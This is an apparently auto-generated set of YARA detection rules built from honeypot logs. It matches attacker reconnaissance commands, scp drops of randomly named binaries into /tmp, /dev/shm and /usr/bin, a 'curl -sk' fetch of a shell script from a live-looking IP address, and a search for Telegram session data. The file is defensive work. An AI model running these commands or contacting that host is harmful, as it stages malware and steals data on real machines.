// LLM Honeypot Intelligence Platform - YARA Rules
// Generated: 20260326_2137
// Source: Elasticsearch honeypot data (24h window)

rule Honeypot_SystemRecon {
    meta:
        description = "LLM Honeypot Intelligence - SystemRecon pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-03-26"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "399"
        unique_patterns = "12"
    strings:
        $s0 = "ps -ef" ascii nocase
        $s1 = "whoami" ascii nocase
        $s2 = "cat /etc/hostname" ascii nocase
        $s3 = "hostname" ascii nocase
        $s4 = "nproc --all" ascii nocase
        $s5 = "lspci" ascii nocase
        $s6 = "nvidia-smi -q" ascii nocase
        $s7 = "cat /proc/cpuinfo" ascii nocase
        $s8 = "uptime -p" ascii nocase
        $s9 = "uptime" ascii nocase
        $s10 = "uname -a" ascii nocase
        $s11 = "ip addr show 2>/dev/null" ascii nocase
    condition:
        any of them
}

rule Honeypot_ToolDownload {
    meta:
        description = "LLM Honeypot Intelligence - ToolDownload pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-03-26"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "18"
        unique_patterns = "12"
    strings:
        $s0 = "scp -t /tmp/zbgjp0yc6izgkftm2p29n0msdb" ascii nocase
        $s1 = "scp -t ~/ltyu2gbpejb4dog81ohvxsrwvs" ascii nocase
        $s2 = "scp -t /bin/ltyu2gbpejb4dog81ohvxsrwvs" ascii nocase
        $s3 = "scp -t /usr/bin/zbgjp0yc6izgkftm2p29n0msdb" ascii nocase
        $s4 = "scp -t /bin/zbgjp0yc6izgkftm2p29n0msdb" ascii nocase
        $s5 = "scp -t /dev/shm/ltyu2gbpejb4dog81ohvxsrwvs" ascii nocase
        $s6 = "scp -t /usr/local/bin/ltyu2gbpejb4dog81ohvxsrwvs" ascii nocase
        $s7 = "scp -t /usr/local/bin/zbgjp0yc6izgkftm2p29n0msdb" ascii nocase
        $s8 = "curl -sk https://31.57.216.121/sh" ascii nocase
        $s9 = "scp -t /dev/shm/zbgjp0yc6izgkftm2p29n0msdb" ascii nocase
        $s10 = "scp -t /var/tmp/ltyu2gbpejb4dog81ohvxsrwvs" ascii nocase
        $s11 = "scp -t /var/tmp/zbgjp0yc6izgkftm2p29n0msdb" ascii nocase
    condition:
        any of them
}

rule Honeypot_DataCollection {
    meta:
        description = "LLM Honeypot Intelligence - DataCollection pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-03-26"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "2"
        unique_patterns = "1"
    strings:
        $s0 = "locate D877F783D5D3EF8Cs" ascii nocase
    condition:
        any of them
}